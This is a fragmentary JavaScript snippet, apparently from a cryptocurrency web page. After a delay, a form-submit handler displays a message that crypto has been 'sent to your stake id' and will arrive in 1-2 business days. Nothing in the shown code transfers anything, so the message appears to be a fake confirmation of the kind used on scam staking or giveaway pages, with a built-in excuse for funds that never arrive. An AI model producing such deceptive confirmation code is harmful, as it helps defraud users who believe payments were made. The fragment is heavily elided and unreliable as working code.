const data = {
  ...
  function submitForm() {
    ...
    setTimeout(() => {
      ...
      msg.innerHTML = `${total} ${crypto} sent to your stake id!<br><br>Due to blockchain traffic your assets will be reflect in 1-2 business days<br>Crypto Sent initiated to your stake id`;
